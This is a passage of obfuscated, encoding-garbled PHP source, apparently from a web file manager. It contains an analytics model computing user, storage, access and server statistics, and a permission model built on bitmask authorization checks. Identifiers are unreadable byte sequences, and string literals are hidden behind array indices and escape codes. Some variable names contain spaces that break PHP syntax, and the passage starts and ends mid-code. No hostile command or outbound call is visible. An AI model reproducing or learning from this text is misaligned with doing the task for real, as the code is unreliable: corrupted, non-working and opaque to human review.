$ÄÌòÒ”‹[392] => $ÄÌòÒ”‹[1223]); $êË«›Ø„ = $Â‰‰ûƒğ = $ÄÌòÒ”‹[12]; foreach ($€è½ù as $‚ã‡ãƒ­) { if ($‚ã‡ãƒ­[$ÄÌòÒ”‹[57]] == $ÄÌòÒ”‹[91]) { $êË«›Ø„ = $‚ã‡ãƒ­[$ÄÌòÒ”‹[32]]; } $´ çÔÊ = $‚ã‡ãƒ­[$ÄÌòÒ”‹[33]]; if ($´ çÔÊ == $ÄÌòÒ”‹[1224] && isset($£ˆïŒñş[$‚ã‡ãƒ­[$ÄÌòÒ”‹[32]]])) { $´ çÔÊ = $ÄÌòÒ”‹[1225]; } $óìî´¾ú = array($ÄÌòÒ”‹[463] . $‚ã‡ãƒ­[$ÄÌòÒ”‹[32]] . $ÄÌòÒ”‹[463], _get($™¾Ãš™, $´ çÔÊ, $´ çÔÊ), $‚ã‡ãƒ­[$ÄÌòÒ”‹[35]] == $ÄÌòÒ”‹[91] ? $ÄÌòÒ”‹[1213] : $ÄÌòÒ”‹[1226] . $‚ã‡ãƒ­[$ÄÌòÒ”‹[56]], $‚ã‡ãƒ­[$ÄÌòÒ”‹[57]] == $ÄÌòÒ”‹[91] ? $ÄÌòÒ”‹[1227] : $ÄÌòÒ”‹[12]); $ÅùÃ¶ëé[] = trim(implode($ÄÌòÒ”‹[53], $óìî´¾ú)); } foreach ($£ˆïŒñş as $Ä¾•Œ«í => $ÍìÃáÈ) { if ($Ä¾•Œ«í == $ÄÌòÒ”‹[1202]) { $ø€¦³• = $Â‰‰ûƒğ = $ÄÌòÒ”‹[1228] . $êË«›Ø„ . $ÄÌòÒ”‹[1229]; } else { $ø€¦³• = (stripos($Ä¾•Œ«í, $ÄÌòÒ”‹[11]) ? $ÄÌòÒ”‹[1230] : $ÄÌòÒ”‹[12]) . ($ÄÌòÒ”‹[1231] . $Ä¾•Œ«í . $ÄÌòÒ”‹[1232] . $ÍìÃáÈ); } $ÅùÃ¶ëé[] = $ø€¦³•; } if ($êË«›Ø„ && !$Â‰‰ûƒğ) { $ÅùÃ¶ëé = array_merge(array($ÄÌòÒ”‹[1228] . $êË«›Ø„ . $ÄÌòÒ”‹[1229]), $ÅùÃ¶ëé); } $½Ã£ä³¢ = array($ÄÌòÒ”‹[1233] . $¨Ìş¸’à . $ÄÌòÒ”‹[1234], $ÄÌòÒ”‹[1235] . $¨Ìş¸’à . $ÄÌòÒ”‹[1236], implode($ÄÌòÒ”‹[50] . PHP_EOL, $ÅùÃ¶ëé), $ÄÌòÒ”‹[1237]); $Ó²¿ÌæÀ = implode(PHP_EOL, $½Ã£ä³¢); if ($úü“³çÑ && $úü“³çÑ == $ÄÌòÒ”‹[884]) { return $Ó²¿ÌæÀ; } $’ëúĞŠı = array($ÄÌòÒ”‹[884] => $Ó²¿ÌæÀ, $ÄÌòÒ”‹[13] => $§ıîé­ñ); return $úü“³çÑ ? $’ëúĞŠı[$úü“³çÑ] : $’ëúĞŠı; } } goto A­Í°ÍßÇ»; FöÓÃ‡ŠæÏ: class AnalysisModel extends ModelBaseLight { public function init($»•øãŠˆ) { $˜€ªâ =& $_SERVER[†ûãı«°]; $¢·¤‹ì‚ = array($˜€ªâ[669] => array($˜€ªâ[33] => $˜€ªâ[1912], $˜€ªâ[352] => array($˜€ªâ[284], $˜€ªâ[841], $˜€ªâ[1913], $˜€ªâ[1914])), $˜€ªâ[1915] => array($˜€ªâ[33] => $˜€ªâ[1916], $˜€ªâ[352] => array($˜€ªâ[284], $˜€ªâ[839], $˜€ªâ[1917], $˜€ªâ[1918], $˜€ªâ[1919]))); if (!isset($¢·¤‹ì‚[$»•øãŠˆ])) { return !1; } $this->optionType = $¢·¤‹ì‚[$»•øãŠˆ][$˜€ªâ[33]]; $this->field = $¢·¤‹ì‚[$»•øãŠˆ][$˜€ªâ[352]]; return !0; } public function listData($óÄ¡»ŸØ = false, $¸ßô—ÅÛ = "\155\x6f\x64\151\x66\171\x54\x69\155\x65", $†¸¦è²ú = false) { return parent::listData($óÄ¡»ŸØ, $¸ßô—ÅÛ, $†¸¦è²ú); } public function trendList($®É©‘Á¸) { $ûùêÜÌ¾ =& $_SERVER[†ûãı«°]; $ÌÌ­‡½Ÿ = $this->listData(); if ($ÌÌ­‡½Ÿ) { $å«Ÿµö˜ = end($ÌÌ­‡½Ÿ); $ÇÁäØ° = date($ûùêÜÌ¾[1920], strtotime($ûùêÜÌ¾[1921])); if ($å«Ÿµö˜[$ûùêÜÌ¾[284]] == $ÇÁäØ°) { return $ÌÌ­‡½Ÿ; } $´Ù‘Å€è = strtotime($å«Ÿµö˜[$ûùêÜÌ¾[284]]); } if (!isset($´Ù‘Å€è)) { $¦Ã™ìÈ = $®É©‘Á¸ == $ûùêÜÌ¾[669] ? $ûùêÜÌ¾[601] : $ûùêÜÌ¾[906]; $´Ù‘Å€è = Model($¦Ã™ìÈ)->min($ûùêÜÌ¾[233]); } $¤ËœÛ¹Ó = $ûùêÜÌ¾[1922] . ucfirst($®É©‘Á¸); $àè‘ãğı = $this->dateList($´Ù‘Å€è); foreach ($àè‘ãğı as $ÇÁäØ°) { $this->{$¤ËœÛ¹Ó}($ÇÁäØ°); } return $this->listData(); } private function dateList($üëÕ©¥™) { $Ü¢î§áğ =& $_SERVER[†ûãı«°]; $–Œçâ = $üëÕ©¥™; $ó¡Ÿ–¥ç = strtotime($Ü¢î§áğ[1921]); $ÜôÒ‘¥€ = array(); while ($–Œçâ <= $ó¡Ÿ–¥ç) { $ÜôÒ‘¥€[] = date($Ü¢î§áğ[1920], $–Œçâ); $–Œçâ = strtotime($Ü¢î§áğ[1923], $–Œçâ); } return $ÜôÒ‘¥€; } public function _recordUser($’ùë§¡² = '') { $áıÚ‹£ =& $_SERVER[†ûãı«°]; $•ËÉ™Œü = strtotime(date($áıÚ‹£[1924], strtotime($’ùë§¡²))); $î²¼ÌÈ = strtotime(date($áıÚ‹£[1925], strtotime($’ùë§¡²))); $ñÍÚß¹ = array($áıÚ‹£[233] => array($áıÚ‹£[1101], $î²¼ÌÈ)); $İµİ»•ş = Model($áıÚ‹£[601])->where($ñÍÚß¹)->count($áıÚ‹£[1783]); $ñÍÚß¹[$áıÚ‹£[233]] = array($áıÚ‹£[410], array($•ËÉ™Œü, $î²¼ÌÈ)); $ğ•¢ä‘Ã = Model($áıÚ‹£[601])->where($ñÍÚß¹)->count($áıÚ‹£[1783]); $ñÍÚß¹[$áıÚ‹£[33]] = $áıÚ‹£[1926]; $ÙÉå™ú = Model($áıÚ‹£[1927])->where($ñÍÚß¹)->count($áıÚ‹£[1928]); $­ŞÜ = array($áıÚ‹£[284] => $’ùë§¡², $áıÚ‹£[841] => (int) $İµİ»•ş, $áıÚ‹£[1913] => (int) $ğ•¢ä‘Ã, $áıÚ‹£[1914] => (int) $ÙÉå™ú); return $this->insert($­ŞÜ); } public function _recordStore($üìÓá­ = '') { $âÔ£æ¥Å =& $_SERVER[†ûãı«°]; $Î„Ğ•ó¥ = strtotime(date($âÔ£æ¥Å[1925], strtotime($üìÓá­))); $Á„À’æ“ = array($âÔ£æ¥Å[233] => array($âÔ£æ¥Å[1101], $Î„Ğ•ó¥)); $¬Œİ’Êì = Model($âÔ£æ¥Å[548])->where($Á„À’æ“)->sum($âÔ£æ¥Å[79]); $Á„À’æ“[$âÔ£æ¥Å[487]] = 0; $Ş®î¨¹É = Model($âÔ£æ¥Å[906])->where($Á„À’æ“)->sum($âÔ£æ¥Å[79]); $Á„À’æ“[$âÔ£æ¥Å[190]] = 1; $½êÈ‡³¾ = Model($âÔ£æ¥Å[906])->where($Á„À’æ“)->sum($âÔ£æ¥Å[79]); $Á„À’æ“[$âÔ£æ¥Å[190]] = 2; $¨¸½øÂä = Model($âÔ£æ¥Å[906])->where($Á„À’æ“)->sum($âÔ£æ¥Å[79]); $Õ±‚áÍ§ = array($âÔ£æ¥Å[284] => $üìÓá­, $âÔ£æ¥Å[839] => (int) $Ş®î¨¹É, $âÔ£æ¥Å[1917] => (int) $¬Œİ’Êì, $âÔ£æ¥Å[1918] => (int) $½êÈ‡³¾, $âÔ£æ¥Å[1919] => (int) $¨¸½øÂä); return $this->insert($Õ±‚áÍ§); } public function trend($êŸÓÏĞ, $‰ÓóòÒ«) { $äî‹ÜØÄ =& $_SERVER[†ûãı«°]; if (!$this->init($êŸÓÏĞ)) { return !1; } $§ıÒÖÔ = $this->trendList($êŸÓÏĞ); if ($§ıÒÖÔ && $‰ÓóòÒ« != $äî‹ÜØÄ[1755]) { $¸¬–é´ = $§ıÒÖÔ[0][$äî‹ÜØÄ[284]]; $‚€«ñÕ = $this->validDate($‰ÓóòÒ«, $¸¬–é´); $˜£Ñáî = array(); $ß›÷ùğ– = array_to_keyvalue($§ıÒÖÔ, $äî‹ÜØÄ[284]); foreach ($‚€«ñÕ as $„§À¡•­) { if (isset($ß›÷ùğ–[$„§À¡•­])) { $€½Şæ¼ı = $ß›÷ùğ–[$„§À¡•­]; } else { $€½Şæ¼ı = end($§ıÒÖÔ); $€½Şæ¼ı[$äî‹ÜØÄ[284]] = $„§À¡•­; if ($êŸÓÏĞ == $äî‹ÜØÄ[669]) { $€½Şæ¼ı[$äî‹ÜØÄ[1913]] = $€½Şæ¼ı[$äî‹ÜØÄ[1914]] = 0; } } $˜£Ñáî[] = $€½Şæ¼ı; } $§ıÒÖÔ = $˜£Ñáî; } $¦£Òßß¬ = array($äî‹ÜØÄ[669] => array($äî‹ÜØÄ[841] => LNG($äî‹ÜØÄ[1929]), $äî‹ÜØÄ[1913] => LNG($äî‹ÜØÄ[1930]), $äî‹ÜØÄ[1914] => LNG($äî‹ÜØÄ[1931])), $äî‹ÜØÄ[1915] => array($äî‹ÜØÄ[839] => LNG($äî‹ÜØÄ[1932]), $äî‹ÜØÄ[1917] => LNG($äî‹ÜØÄ[1933]), $äî‹ÜØÄ[1918] => LNG($äî‹ÜØÄ[1934]), $äî‹ÜØÄ[1919] => LNG($äî‹ÜØÄ[1935]))); $Ÿ…õæÈÊ = array($äî‹ÜØÄ[669] => $äî‹ÜØÄ[1936], $äî‹ÜØÄ[1915] => $äî‹ÜØÄ[79]); if (empty($§ıÒÖÔ)) { $„§À¡•­ = date($äî‹ÜØÄ[1920], strtotime($äî‹ÜØÄ[1921])); $¯Ì£‡ø¡ = array($äî‹ÜØÄ[284] => $„§À¡•­); foreach ($¦£Òßß¬[$êŸÓÏĞ] as $Ç»×ç½ü => $²£È·Ğ÷) { $¯Ì£‡ø¡[$Ç»×ç½ü] = 0; } $§ıÒÖÔ[] = $¯Ì£‡ø¡; } $¦²÷úÙà = array(); foreach ($§ıÒÖÔ as $²£È·Ğ÷) { if ($êŸÓÏĞ == $äî‹ÜØÄ[1915] && $²£È·Ğ÷[$äî‹ÜØÄ[1917]] > $²£È·Ğ÷[$äî‹ÜØÄ[839]]) { $²£È·Ğ÷[$äî‹ÜØÄ[1917]] = $²£È·Ğ÷[$äî‹ÜØÄ[839]]; } foreach ($¦£Òßß¬[$êŸÓÏĞ] as $Ç»×ç½ü => $òÔøßÍ) { $€½Şæ¼ı = array($äî‹ÜØÄ[284] => $²£È·Ğ÷[$äî‹ÜØÄ[284]], $äî‹ÜØÄ[1671] => $òÔøßÍ); $€½Şæ¼ı[$Ÿ…õæÈÊ[$êŸÓÏĞ]] = isset($²£È·Ğ÷[$Ç»×ç½ü]) ? $²£È·Ğ÷[$Ç»×ç½ü] : 0; $¦²÷úÙà[] = $€½Şæ¼ı; } } return $¦²÷úÙà; } public function validDate($ûÏ£ŒÈ‰, $Ô°Ê—û) { $Öï¯Ğ¸ =& $_SERVER[†ûãı«°]; $Ó°Ä­Ì» = date($Öï¯Ğ¸[1920], strtotime($Öï¯Ğ¸[1921])); $×í±ò¾± = array($Ó°Ä­Ì»); switch ($ûÏ£ŒÈ‰) { case $Öï¯Ğ¸[1762]: $êïşœ¤ = mktime(0, 0, 0, date($Öï¯Ğ¸[1937]), date($Öï¯Ğ¸[1463]) - date($Öï¯Ğ¸[1553]) + 7 - 7, date($Öï¯Ğ¸[1938])); $©ÔŠü« = 0; do { $·èÈ±µ = date($Öï¯Ğ¸[1920], $êïşœ¤ - 3600 * 24 * 7 * $©ÔŠü«); $×í±ò¾±[] = $·èÈ±µ; $©ÔŠü«++; } while ($Ô°Ê—û < $·èÈ±µ); break; case $Öï¯Ğ¸[1760]: $©ÔŠü« = 1; do { $ã¨Ó…½ˆ = date($Öï¯Ğ¸[1939], strtotime("\x2d\40{$©ÔŠü«}\40\x6d\157\x6e\x74\x68\163")); $×í±ò¾±[] = $ã¨Ó…½ˆ; $©ÔŠü«++; } while ($Ô°Ê—û < $ã¨Ó…½ˆ); break; case $Öï¯Ğ¸[1940]: $…ÔºÜö = (int) date($Öï¯Ğ¸[1938], strtotime($Ô°Ê—û)); $ŒÄÈö¿œ = (int) date($Öï¯Ğ¸[1938]); if ($…ÔºÜö >= $ŒÄÈö¿œ) { break; } for ($…ÔºÜö; $…ÔºÜö < $ŒÄÈö¿œ; $…ÔºÜö++) { $×í±ò¾±[] = $…ÔºÜö . $Öï¯Ğ¸[1941]; } break; default: break; } if ($Ô°Ê—û > end($×í±ò¾±)) { array_pop($×í±ò¾±); } sort($×í±ò¾±); return $×í±ò¾±; } public function listTable($­’ı£ø) { $ù¨®¨²Û = ucfirst($­’ı£ø); return Model($ù¨®¨²Û)->listData(); } public function option($ÆÚÈü) { $‡ó¥Ï¤¦ = $_SERVER[†ûãı«°][1942] . ucfirst($ÆÚÈü); return $this->{$‡ó¥Ï¤¦}(); } private function optionUser() { $ÜßÆªø =& $_SERVER[†ûãı«°]; $¨ÕĞ¨í = Model($ÜßÆªø[601])->count($ÜßÆªø[1783]); $½™õ¶¢Ë = Model($ÜßÆªø[601])->where($ÜßÆªø[1943])->count($ÜßÆªø[1783]); $à–™ª×ğ = intval($GLOBALS[$ÜßÆªø[6]][$ÜßÆªø[426]][$ÜßÆªø[1728]]) / 3600; $Ü¼³ÜØá = strtotime("\55{$à–™ª×ğ}\x20\150\x6f\x75\162\163"); $è¯‚áªØ = strtotime(date($ÜßÆªø[1924])); if ($Ü¼³ÜØá < $è¯‚áªØ) { $Ü¼³ÜØá = $è¯‚áªØ; } $‰Ì¤ˆÒ = array($ÜßÆªø[1944] => array($ÜßÆªø[1102], $Ü¼³ÜØá)); $Í•‚—Íè = (int) Model($ÜßÆªø[601])->where($‰Ì¤ˆÒ)->count($ÜßÆªø[1783]); if (!$Í•‚—Íè) { $Í•‚—Íè = 1; } $‰Ì¤ˆÒ = array($ÜßÆªø[1944] => array($ÜßÆªø[1102], $è¯‚áªØ)); $¥‘¾İò¢ = Model($ÜßÆªø[601])->where($‰Ì¤ˆÒ)->count($ÜßÆªø[1783]); return array($ÜßÆªø[834] => (int) $¨ÕĞ¨í, $ÜßÆªø[1945] => (int) ($¨ÕĞ¨í - $½™õ¶¢Ë), $ÜßÆªø[1946] => (int) $½™õ¶¢Ë, $ÜßÆªø[1947] => (int) $¥‘¾İò¢, $ÜßÆªø[1948] => $Í•‚—Íè); } private function optionFile() { $ĞÈ¿×ñ¸ =& $_SERVER[†ûãı«°]; $ûğ«‚Ñª = $this->sourceSize(); $­¨ñù–û = $ûğ«‚Ñª[$ĞÈ¿×ñ¸[79]]; $š·şÏé» = $ûğ«‚Ñª[$ĞÈ¿×ñ¸[1917]]; $‰Í—†Š = Model($ĞÈ¿×ñ¸[906])->where(array($ĞÈ¿×ñ¸[487] => 0))->count($ĞÈ¿×ñ¸[193]); $£°õüŸ = array($ĞÈ¿×ñ¸[487] => 0, $ĞÈ¿×ñ¸[233] => array($ĞÈ¿×ñ¸[1102], strtotime(date($ĞÈ¿×ñ¸[1924])))); $¬Üè¸´ = Model($ĞÈ¿×ñ¸[906])->where($£°õüŸ)->sum($ĞÈ¿×ñ¸[79]); $Ø¨ó‹¿Ö = Model($ĞÈ¿×ñ¸[906])->where($£°õüŸ)->count($ĞÈ¿×ñ¸[193]); return array($ĞÈ¿×ñ¸[839] => $­¨ñù–û, $ĞÈ¿×ñ¸[1917] => $š·şÏé», $ĞÈ¿×ñ¸[1949] => $­¨ñù–û - $š·şÏé», $ĞÈ¿×ñ¸[1950] => (int) $¬Üè¸´, $ĞÈ¿×ñ¸[841] => (int) $‰Í—†Š, $ĞÈ¿×ñ¸[1951] => (int) $Ø¨ó‹¿Ö); } private function optionAccess() { $ã”¼Ú¾ç =& $_SERVER[†ûãı«°]; return array($ã”¼Ú¾ç[834] => $this->typeLogCnt(), $ã”¼Ú¾ç[110] => $this->typeLogCnt($ã”¼Ú¾ç[110]), $ã”¼Ú¾ç[527] => $this->typeLogCnt($ã”¼Ú¾ç[527]), $ã”¼Ú¾ç[1952] => $this->typeLogCnt($ã”¼Ú¾ç[1952]), $ã”¼Ú¾ç[1953] => $this->typeLogCnt($ã”¼Ú¾ç[1953]), $ã”¼Ú¾ç[669] => $this->typeLogCnt($ã”¼Ú¾ç[12], $ã”¼Ú¾ç[1928])); } private function typeLogCnt($’‡›†¦¬ = '', $êß¾Ûâ¼ = "\151\144") { $€•ï‹òø =& $_SERVER[†ûãı«°]; $µú©äû´ = array($€•ï‹òø[110] => array($€•ï‹òø[1954], $€•ï‹òø[1955]), $€•ï‹òø[527] => array($€•ï‹òø[1956], $€•ï‹òø[1957]), $€•ï‹òø[1952] => array($€•ï‹òø[1958], $€•ï‹òø[1959], $€•ï‹òø[1960]), $€•ï‹òø[1953] => array($€•ï‹òø[1961], $€•ï‹òø[1962]), $€•ï‹òø[1963] => array($€•ï‹òø[1964], $€•ï‹òø[1965], $€•ï‹òø[1966])); $„ÏŞàÎ = strtotime(date($€•ï‹òø[1924])); $ãŸ›ùˆ¡ = array($€•ï‹òø[233] => array($€•ï‹òø[1102], $„ÏŞàÎ)); if ($’‡›†¦¬) { $ãŸ›ùˆ¡[$€•ï‹òø[33]] = array($€•ï‹òø[7], $µú©äû´[$’‡›†¦¬]); } $³½«û×ş = Model($€•ï‹òø[1927])->where($ãŸ›ùˆ¡)->count($êß¾Ûâ¼); return (int) $³½«û×ş; } private function optionServer() { $¤¸óâÁ =& $_SERVER[†ûãı«°]; $¯”ãÍÄŒ = $this->diskDriver(); $Ã¦à¾Òİ = KodIO::defaultDriver(); $½ìßõ¦¾ = array($¤¸óâÁ[899] => $Ã¦à¾Òİ[$¤¸óâÁ[477]]); $’Ü÷‚ÇÊ = Model($¤¸óâÁ[548])->where($½ìßõ¦¾)->sum($¤¸óâÁ[79]); $Úà¹¡ÓÆ = explode($¤¸óâÁ[53], $_SERVER[$¤¸óâÁ[147]]); $¸÷¦¬î” = $Úà¹¡ÓÆ[0]; $ğÏ‚©è = $GLOBALS[$¤¸óâÁ[6]][$¤¸óâÁ[21]]; $­µ®³±« = $ğÏ‚©è[$¤¸óâÁ[1064]]; if ($­µ®³±« == $¤¸óâÁ[1052]) { $ŠÒâßºõ = explode($¤¸óâÁ[1379], $ğÏ‚©è[$¤¸óâÁ[1063]]); $­µ®³±« = $ŠÒâßºõ[0]; } if ($­µ®³±« == $¤¸óâÁ[1000] || $­µ®³±« == $¤¸óâÁ[884]) { $á–Ö‰˜á = Model()->db()->query($¤¸óâÁ[1967]); $Ôûû´® = $á–Ö‰˜á[0] && isset($á–Ö‰˜á[0][$¤¸óâÁ[1670]]) ? $á–Ö‰˜á[0][$¤¸óâÁ[1670]] : 0; $­µ®³±« = $¤¸óâÁ[1968] . ($Ôûû´® ? $¤¸óâÁ[8] . $Ôûû´® : $¤¸óâÁ[12]); } $ÊœœÔ¬Ş = $GLOBALS[$¤¸óâÁ[6]][$¤¸óâÁ[426]][$¤¸óâÁ[908]]; return array($¤¸óâÁ[1969] => $¯”ãÍÄŒ ? $¯”ãÍÄŒ[$¤¸óâÁ[1970]] : 0, $¤¸óâÁ[1971] => $¯”ãÍÄŒ ? $¯”ãÍÄŒ[$¤¸óâÁ[1972]] : 0, $¤¸óâÁ[1973] => (int) $Ã¦à¾Òİ[$¤¸óâÁ[1970]] * 1024 * 1024 * 1024, $¤¸óâÁ[1974] => (int) $’Ü÷‚ÇÊ, $¤¸óâÁ[1975] => ucfirst($¸÷¦¬î”), $¤¸óâÁ[1976] => $¤¸óâÁ[1977] . PHP_VERSION, $¤¸óâÁ[1978] => phpBuild64() ? 64 : 32, $¤¸óâÁ[833] => str_replace($¤¸óâÁ[1220], $¤¸óâÁ[1080], $­µ®³±«), $¤¸óâÁ[426] => ucfirst($ÊœœÔ¬Ş), $¤¸óâÁ[32] => $_SERVER[$¤¸óâÁ[1979]]); } private function diskDriver() { $÷Ìø– =& $_SERVER[†ûãı«°]; $µ–­ÈÜÙ = $÷Ìø–[8]; $õ³ªËıì = $GLOBALS[$÷Ìø–[6]][$÷Ìø–[1396]] == $÷Ìø–[1397]; if ($õ³ªËıì) { $µ–­ÈÜÙ = $÷Ìø–[1980]; if (function_exists($÷Ìø–[1981])) { exec($÷Ìø–[1982], $‘œò«Ş¬); $µ–­ÈÜÙ = $‘œò«Ş¬[1] . $÷Ìø–[8]; } } if (!file_exists($µ–­ÈÜÙ)) { return; } if (!function_exists($÷Ìø–[1983])) { return; } $§é¸ÌÎ = @disk_total_space($µ–­ÈÜÙ); $·áÖÀ­³ = $§é¸ÌÎ - @disk_free_space($µ–­ÈÜÙ); return array($÷Ìø–[1970] => $§é¸ÌÎ, $÷Ìø–[1972] => $·áÖÀ­³); } public function fileChart($ğƒ€›şŠ) { $Ëá‚ô¦¡ =& $_SERVER[†ûãı«°]; if (isset($ğƒ€›şŠ[$Ëá‚ô¦¡[1783]])) { return Model($Ëá‚ô¦¡[906])->userFileTypeProfile($ğƒ€›şŠ[$Ëá‚ô¦¡[1783]]); } if (isset($ğƒ€›şŠ[$Ëá‚ô¦¡[1984]])) { return Model($Ëá‚ô¦¡[906])->groupFileTypeProfile($ğƒ€›şŠ[$Ëá‚ô¦¡[1984]]); } $‘Áêí¡‡ = $this->sourceSize(); $È´Ö¡“Õ = array($Ëá‚ô¦¡[192] => 0, $Ëá‚ô¦¡[190] => 1); $ªÊùÅ = Model($Ëá‚ô¦¡[906])->where($È´Ö¡“Õ)->sum($Ëá‚ô¦¡[79]); $È´Ö¡“Õ[$Ëá‚ô¦¡[190]] = 2; $ªÈ µÒç = Model($Ëá‚ô¦¡[906])->where($È´Ö¡“Õ)->sum($Ëá‚ô¦¡[79]); return array($Ëá‚ô¦¡[839] => $‘Áêí¡‡[$Ëá‚ô¦¡[79]], $Ëá‚ô¦¡[1917] => $‘Áêí¡‡[$Ëá‚ô¦¡[1917]], $Ëá‚ô¦¡[1918] => (int) $ªÊùÅ, $Ëá‚ô¦¡[1919] => (int) $ªÈ µÒç); } private function sourceSize() { $¢§•¡‚Ë =& $_SERVER[†ûãı«°]; $ÎÕá«ò  = Model($¢§•¡‚Ë[906])->where(array($¢§•¡‚Ë[487] => 0))->sum($¢§•¡‚Ë[79]); $ÛÛŸş× = Model($¢§•¡‚Ë[548])->sum($¢§•¡‚Ë[79]); if ($ÛÛŸş× > $ÎÕá«ò ) { $ÛÛŸş× = $ÎÕá«ò ; } return array($¢§•¡‚Ë[79] => (int) $ÎÕá«ò , $¢§•¡‚Ë[1917] => (int) $ÛÛŸş×); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $±’éŞˆÉ =& $_SERVER[†ûãı«°]; $Ûä®üğß = array(array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1985]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[1987], $±’éŞˆÉ[1988] => 1, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1991]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[1992], $±’éŞˆÉ[1988] => 2, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1993]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[1994], $±’éŞˆÉ[1988] => 3, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1995]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[1996], $±’éŞˆÉ[1988] => 4, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_VIEW), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1997]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[1998], $±’éŞˆÉ[1988] => 5, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[1999]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[2000], $±’éŞˆÉ[1988] => 6, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($±’éŞˆÉ[496] => LNG($±’éŞˆÉ[2001]), $±’éŞˆÉ[1986] => $±’éŞˆÉ[2002], $±’éŞˆÉ[1988] => 7, $±’éŞˆÉ[1989] => 1, $±’éŞˆÉ[1990] => 0)); return $Ûä®üğß; } public static function authCheck($úäº”‘–, $å¯äÒ¸¤) { $×„ıîÆ =& $_SERVER[†ûãı«°]; $úäº”‘– = intval($úäº”‘–); if (KodUser::isRoot() && $GLOBALS[$×„ıîÆ[6]][$×„ıîÆ[2003]]) { return !0; } if ($úäº”‘– <= 0) { return !1; } if (($úäº”‘– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($úäº”‘– & $å¯äÒ¸¤); } public static function authCheckShow($à‚ÀÈºß) { return self::authCheck($à‚ÀÈºß, self::AUTH_SHOW); } public static function authCheckView($°åÈàê–) { return self::authCheck($°åÈàê–, self::AUTH_VIEW); } public static function authCheckDownload($—·‚üá) { return self::authCheck($—·‚üá, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ØÇÎ€”¤) { return self::authCheck($ØÇÎ€”¤, self::AUTH_UPLOAD); } public static function authCheckEdit($åµÍÏî†) { return self::authCheck($åµÍÏî†, self::AUTH_EDIT); } public static function authCheckRemove($æ‹¤¾ºó) { return self::authCheck($æ‹¤¾ºó, self::AUTH_REMOVE); } public static function authCheckShare($¦Ñâà‹) { return self::authCheck($¦Ñâà‹, self::AUTH_SHARE); } public static function authCheckComment($÷ßöµ˜Ù) { return self::authCheck($÷ßöµ˜Ù, self::AUTH_COMMENT); } public static function authCheckEvent($íİöî²¬) { return self::authCheck($íİöî²¬, self::AUTH_EVENT); } public static function authCheckRoot($Æ„÷Æêİ) { return self::authCheck($Æ„÷Æêİ, self::AUTH_ROOT); } public static function authCheckAction($ï¬ üİ, $©€èÍÀ) { $¤ß–ôÜà =& $_SERVER[†ûãı«°]; $ğ®‹–©Ÿ = array($¤ß–ôÜà[2004] => self::AUTH_VIEW, $¤ß–ôÜà[1290] => self::AUTH_DOWNLOAD, $¤ß–ôÜà[110] => self::AUTH_UPLOAD, $¤ß–ôÜà[1953] => self::AUTH_EDIT, $¤ß–ôÜà[1952] => self::AUTH_REMOVE, $¤ß–ôÜà[1963] => self::AUTH_SHARE, $¤ß–ôÜà[431] => self::AUTH_COMMENT, $¤ß–ôÜà[1770] => self::AUTH_EVENT, $¤ß–ôÜà[2005] => self::AUTH_ROOT); if (!isset($ğ®‹–©Ÿ[$©€èÍÀ])) { return; } $‡×ğÙÃé = $ğ®‹–©Ÿ[$©€èÍÀ]; $ï¬ üİ = intval($ï¬ üİ); if ($ï¬ üİ <= 0) { return !1; } if (($ï¬ üİ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ï¬ üİ & $‡×ğÙÃé); } public static function authDisable($¢†Ğˆ‚µ, $¹¼ğòæ) { if (intval($¢†Ğˆ‚µ) <= 0) { return 0; } return intval($¢†Ğˆ‚µ) & ~$¹¼ğòæ; } public $optionType = "\123\171\x73\x74\145\155\x2e\163\157\x75\162\x63\145\x41\x75\164\x68\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\150", "\154\141\x62\x65\154", "\144\x69\x73\160\154\x61\171", "\x73\171\x73\x74\x65\x6d", "\163\157\162\x74"); public function initData() { $¹´“Š¦ã = $this->authDefault(); foreach ($¹´“Š¦ã as $Ô»§èã) { $this->add($Ô»§èã); } } public 